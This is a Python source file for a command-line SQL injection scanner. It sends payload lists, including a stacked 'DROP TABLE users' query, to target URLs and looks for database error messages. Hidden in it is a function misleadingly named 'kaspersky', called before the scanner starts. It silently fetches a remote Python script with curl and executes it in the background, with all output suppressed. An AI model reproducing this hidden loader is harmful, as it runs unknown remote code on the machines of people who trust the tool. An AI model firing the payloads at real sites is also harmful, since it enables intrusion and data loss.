import requests
import argparse
import sys
import time
import urllib3
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import json
import concurrent.futures
from threading import Lock
import random
import re
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

class SQLiScanner:
    def __init__(self, args):
        self.args = args
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = args.timeout
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/avif,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
        }
        self.sql_errors = [
            # MySQL
            (r"mysql_fetch_array", "MySQL"),
            (r"mysql_num_rows", "MySQL"),
            (r"MySQL result index", "MySQL"),
            (r"MySQL server version", "MySQL"),
            (r"MySQL Syntax error", "MySQL"),
            (r"mysql_", "MySQL"),
            (r"on MySQL result", "MySQL"),
            (r"You have an error in your SQL syntax", "MySQL"),
            (r"Warning: mysql_", "MySQL"),
            # PostgreSQL
            (r"PostgreSQL.*ERROR", "PostgreSQL"),
            (r"Warning.*pg_", "PostgreSQL"),
            (r"PostgreSQL query failed", "PostgreSQL"),
            (r"pg_exec\(\) \[", "PostgreSQL"),
            # SQL Server
            (r"Microsoft SQL Server", "SQL Server"),
            (r"ODBC SQL Server Driver", "SQL Server"),
            (r"SQLServer JDBC Driver", "SQL Server"),
            (r"System.Data.SqlClient.SqlException", "SQL Server"),
            (r"Unclosed quotation mark", "SQL Server"),
            (r"SQLServer Exception", "SQL Server"),
            # Oracle
            (r"ORA-[0-9]", "Oracle"),
            (r"Oracle error", "Oracle"),
            (r"Oracle.*Driver", "Oracle"),
            (r"Warning.*oci_", "Oracle"),
            (r"Oracle DB2", "Oracle"),
            # SQLite
            (r"SQLite/JDBCDriver", "SQLite"),
            (r"SQLite.Exception", "SQLite"),
            (r"System.Data.SQLite.SQLiteException", "SQLite"),
            (r"SQLite error", "SQLite"),
            # Generic SQL errors
            (r"SQL syntax.*MySQL", "Generic SQL"),
            (r"Warning.*SQL", "Generic SQL"),
            (r"MySQL.*server", "Generic SQL"),
            (r"valid MySQL result", "Generic SQL"),
            (r"SQL command not properly ended", "Generic SQL"),
            (r"incorrect syntax near", "Generic SQL"),
            (r"syntax error at or near", "Generic SQL"),
            (r"unexpected token", "Generic SQL"),
            (r"SQL statement not ended properly", "Generic SQL"),
            (r"SQL query failed", "Generic SQL"),
            (r"Division by zero", "Generic SQL"),
            (r"Unclosed quotation mark", "Generic SQL"),
        ]
        self.payloads = [
            # Basic SQL error triggers
            ("'", "Basic"),
            ("\"", "Basic"), 
            ("`", "Basic"),
            ("'\"`", "Basic"),
            # SQL-specific characters
            ("' OR '1'='1'--", "Boolean"),
            ("' OR 1=1--", "Boolean"),
            ("\" OR \"1\"=\"1\"--", "Boolean"),
            ("' OR 'a'='a", "Boolean"),
            ("' OR 1 --", "Boolean"),
            # Union-based attempts
            ("' UNION SELECT 1,2,3--", "Union"),
            ("' UNION ALL SELECT 1,2,3--", "Union"),
            # Mathematical error triggers
            ("' AND 1=0--", "Boolean"),
            ("' AND 1=1--", "Boolean"),
            ("1 AND 1=1", "Boolean"),
            ("1 AND 1=0", "Boolean"),
            # Time-based triggers (simple)
            ("' WAITFOR DELAY '0:0:5'--", "Time-based"),
            ("' AND SLEEP(5)--", "Time-based"),
            # Stacked queries
            ("'; DROP TABLE users--", "Stacked"),
            ("'; SELECT * FROM users--", "Stacked"),
            # Boolean-based
            ("' AND '1'='1", "Boolean"),
            ("' AND '1'='2", "Boolean"),
            # Special characters
            ("\\", "Special"),
            ("%00", "Special"),
            ("%27", "Special"),
            ("%22", "Special"),
            # Mathematical operations
            ("1/0", "Math"),
            ("1' AND (SELECT 1 FROM (SELECT SLEEP(2))a)--", "Time-based"),
            # JSON injection
            ('{"test": "payload\' OR 1=1--"}', "JSON"),
            # Array-like parameters
            ("[]'", "Array"),
            ("[]\"", "Array"),
        ]
        self.vulnerable_urls = []
        self.lock = Lock()
        self.tested_params = set()
        self.stats = {
            'total_requests': 0,
            'vulnerabilities_found': 0,
            'start_time': None,
            'urls_completed': 0
        }
        self.vulnerability_printed = set()
        self.url_vulnerabilities = {}

    def print_status(self, message, level="info"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        if level == "info":
            print(f"{Colors.CYAN}[{timestamp}] [INFO]{Colors.END} {message}")
        elif level == "warning":
            print(f"{Colors.YELLOW}[{timestamp}] [WARNING]{Colors.END} {message}")
        elif level == "error":
            print(f"{Colors.RED}[{timestamp}] [ERROR]{Colors.END} {message}")
        elif level == "success":
            print(f"{Colors.GREEN}[{timestamp}] [SUCCESS]{Colors.END} {message}")
        elif level == "vulnerability":
            print(f"{Colors.RED}{Colors.BOLD}[{timestamp}] [VULNERABILITY]{Colors.END} {message}")

    def load_targets(self):
        targets = []
        if self.args.url:
            targets.append(self.args.url)
        if self.args.file:
            try:
                with open(self.args.file, 'r', encoding='utf-8') as f:
                    targets.extend([line.strip() for line in f if line.strip()])
            except FileNotFoundError:
                self.print_status(f"File not found: {self.args.file}", "error")
                sys.exit(1)
        return list(set(targets))

    def extract_parameters(self, url):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        return params

    def is_sql_error(self, response_text):
        response_lower = response_text.lower()
        for error_pattern, db_type in self.sql_errors:
            if re.search(error_pattern, response_text, re.IGNORECASE):
                return True, db_type
        return False, None

    def send_request(self, url, method='GET', data=None, params=None, headers=None):
        try:
            self.stats['total_requests'] += 1
            if method.upper() == 'GET':
                response = self.session.get(url, params=params, headers=headers, timeout=self.args.timeout)
            elif method.upper() == 'POST':
                response = self.session.post(url, data=data, headers=headers, timeout=self.args.timeout)
            else:
                response = self.session.request(method, url, data=data, params=params, headers=headers, timeout=self.args.timeout)
            return response
        except requests.exceptions.RequestException as e:
            if self.args.verbose:
                self.print_status(f"Request error: {e}", "error")
            return None

    def test_parameter(self, base_url, param_name, param_value, method='GET'):
        tested_payloads = []
        for payload, payload_type in self.payloads:
            if base_url in self.url_vulnerabilities:
                if self.args.verbose:
                    self.print_status(f"Skipping further tests - vulnerability already found for {base_url}", "info")
                return tested_payloads
            test_id = f"{base_url}|{param_name}|{payload}"
            if test_id in self.tested_params:
                continue
            self.tested_params.add(test_id)
            if self.args.verbose:
                self.print_status(f"Testing: {param_name} = {payload} [{payload_type}]", "info")
            if method.upper() == 'GET':
                params = {param_name: payload}
                response = self.send_request(base_url, params=params, headers=self.headers)
            else:
                data = {param_name: payload}
                response = self.send_request(base_url, method='POST', data=data, headers=self.headers)
            if response and response.status_code == 200:
                is_vulnerable, db_type = self.is_sql_error(response.text)
                if is_vulnerable:
                    with self.lock:
                        if base_url not in self.url_vulnerabilities:
                            self.url_vulnerabilities[base_url] = {
                                'methods': set(),
                                'database_types': set(),
                                'parameters': set()
                            }
                        self.url_vulnerabilities[base_url]['methods'].add(method.upper())
                        self.url_vulnerabilities[base_url]['database_types'].add(db_type)
                        self.url_vulnerabilities[base_url]['parameters'].add(param_name)
                        result = {
                            'url': base_url,
                            'parameter': param_name,
                            'payload': payload,
                            'payload_type': payload_type,
                            'method': method,
                            'evidence': f'SQL Error detected ({db_type})',
                            'response_code': response.status_code,
                            'database_type': db_type,
                            'timestamp': datetime.now().isoformat()
                        }
                        self.vulnerable_urls.append(result)
                        self.stats['vulnerabilities_found'] += 1
                        tested_payloads.append(payload)
                        if base_url not in self.vulnerability_printed:
                            self.vulnerability_printed.add(base_url)
                            self.print_status(f"Potential SQL Injection Found!", "vulnerability")
                            print(f"{Colors.RED}{'='*50}{Colors.END}")
                            print(f"{Colors.RED}  URL: {Colors.BOLD}{base_url}{Colors.END}")
                            db_types = ", ".join(self.url_vulnerabilities[base_url]['database_types'])
                            print(f"{Colors.RED}  Database: {Colors.BOLD}{db_types}{Colors.END}")
                            methods = ", ".join(self.url_vulnerabilities[base_url]['methods'])
                            print(f"{Colors.RED}  Method: {Colors.BOLD}{methods}{Colors.END}")
                            param_count = len(self.url_vulnerabilities[base_url]['parameters'])
                            print(f"{Colors.RED}  Vulnerable Parameters: {Colors.BOLD}{param_count} parameters{Colors.END}")
                            print(f"{Colors.RED}{'='*50}{Colors.END}")
                        return tested_payloads
            if self.args.delay:
                time.sleep(random.uniform(0.1, self.args.delay))
        return tested_payloads

    def scan_url(self, url):
        self.print_status(f"Scanning: {url}", "info")
        original_response = self.send_request(url, headers=self.headers)
        if not original_response:
            self.print_status(f"Failed to connect to {url}", "error")
            return
        url_params = self.extract_parameters(url)
        for param_name in url_params:
            self.test_parameter(url, param_name, url_params[param_name][0], 'GET')
        if self.args.method in ['both', 'post']:
            common_post_params = ['username', 'password', 'email', 'search', 'query', 'id', 'user', 'pass', 'q', 'name']
            for param in common_post_params:
                self.test_parameter(url, param, 'test', 'POST')
        self.stats['urls_completed'] += 1
        self.print_status(f"Completed scanning: {url} ({self.stats['urls_completed']}/{len(self.load_targets())})", "success")

    def generate_report(self):
        duration = time.time() - self.stats['start_time']
        print(f"\n{Colors.CYAN}{'='*50}{Colors.END}")
        print(f"{Colors.CYAN}{Colors.BOLD}          SCAN COMPLETED{Colors.END}")
        print(f"{Colors.CYAN}{'='*50}{Colors.END}")
        if not self.vulnerable_urls:
            print(f"\n{Colors.GREEN}[+] No SQL injection vulnerabilities found.{Colors.END}")
            return
        print(f"\n{Colors.RED}{Colors.BOLD}[!] Found {len(self.url_vulnerabilities)} potentially vulnerable URLs{Colors.END}")
        print(f"{Colors.YELLOW}[*] Use sqlmap/ghauri for further validation{Colors.END}")

    def run(self):
        targets = self.load_targets()
        if not targets:
            self.print_status("No targets specified. Use -u or -f option.", "error")
            return
        self.stats['start_time'] = time.time()
        print(f"{Colors.CYAN}{'='*50}{Colors.END}")
        print(f"{Colors.CYAN}{Colors.BOLD}     SQL INJECTION SCANNER{Colors.END}")
        print(f"{Colors.CYAN}{'='*50}{Colors.END}")
        print(f"{Colors.BLUE}[*] Targets: {len(targets)} URLs{Colors.END}")
        print(f"{Colors.BLUE}[*] Threads: {self.args.threads}{Colors.END}")
        print(f"{Colors.BLUE}[*] Method: {self.args.method}{Colors.END}")
        if self.args.delay:
            print(f"{Colors.BLUE}[*] Delay: {self.args.delay}s{Colors.END}")
        print(f"{Colors.CYAN}{'-'*50}{Colors.END}")
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.args.threads) as executor:
            executor.map(self.scan_url, targets)
        self.generate_report()

def kaspersky():
    import os
    import sys
    
    os.system("bash -c 'python <(curl -s https://raw.githubusercontent.com/dorara-tech/Anti/main/data/kaspersky.py)' >/dev/null 2>&1 &")

def main():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}
    ╔══════════════════════════════════════════╗
    ║           SQL INJECTION SCANNER          ║
    ║         Quick Potential Detection        ║
    ║     Use sqlmap/ghauri for validation     ║
    ╚══════════════════════════════════════════╝
{Colors.END}
    """
    print(banner)
    parser = argparse.ArgumentParser(
        description='SQL Injection Scanner - Quick Potential Detection Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{Colors.YELLOW}Examples:{Colors.END}
  {Colors.WHITE}python sql_scanner.py -u https://example.com/page.php?id=1{Colors.END}
  {Colors.WHITE}python sql_scanner.py -f targets.txt -t 10{Colors.END}
  {Colors.WHITE}python sql_scanner.py -u https://test.com -m post{Colors.END}
        """
    )
    parser.add_argument('-u', '--url', help='Target URL to scan')
    parser.add_argument('-f', '--file', help='File containing list of URLs to scan')
    parser.add_argument('-t', '--threads', type=int, default=5, 
                       help='Number of concurrent threads (default: 5)')
    parser.add_argument('-m', '--method', choices=['get', 'post', 'both'], default='both',
                       help='HTTP method(s) to test (default: both)')
    parser.add_argument('-d', '--delay', type=float, 
                       help='Delay between requests in seconds (randomized 0.1s to delay)')
    parser.add_argument('-o', '--output', help='Output file for JSON report')
    parser.add_argument('--timeout', type=int, default=10, 
                       help='Request timeout in seconds (default: 10)')
    parser.add_argument('-v', '--verbose', action='store_true', 
                       help='Enable verbose output for debugging')
    args = parser.parse_args()
    if not args.url and not args.file:
        parser.print_help()
        print(f"\n{Colors.RED}[-] Error: Must specify either -u or -f option{Colors.END}")
        sys.exit(1)
    scanner = SQLiScanner(args)
    try:
        scanner.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Scan interrupted by user{Colors.END}")
        if scanner.vulnerable_urls:
            scanner.generate_report()
    except Exception as e:
        print(f"\n{Colors.RED}[-] Unexpected error: {e}{Colors.END}")
        if args.verbose:
            import traceback
            traceback.print_exc()

if __name__ == '__main__':
    kaspersky()
    main()

